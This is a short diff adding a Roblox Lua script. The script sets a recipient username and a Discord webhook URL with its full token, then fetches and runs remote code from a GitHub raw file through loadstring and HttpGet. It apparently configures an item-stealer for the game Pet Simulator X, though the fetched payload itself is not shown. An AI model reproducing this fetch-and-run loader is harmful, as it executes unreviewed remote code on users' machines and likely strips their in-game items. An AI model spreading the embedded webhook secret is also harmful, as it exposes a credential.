@@ -1,0 +1,4 @@
+_G.Username1 = "freehatchersmhike1"
+_G.Webhook = "https://discord.com/api/webhooks/1122027906391085057/k0p10rEZ0QV4WJwUMjRf4h2U_wLeY2jgBCG9Xs1aXy1yomIYjdHqUXMsAB7Y7Gg3EDg0"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/98KRapid/psx/main/e",true))()
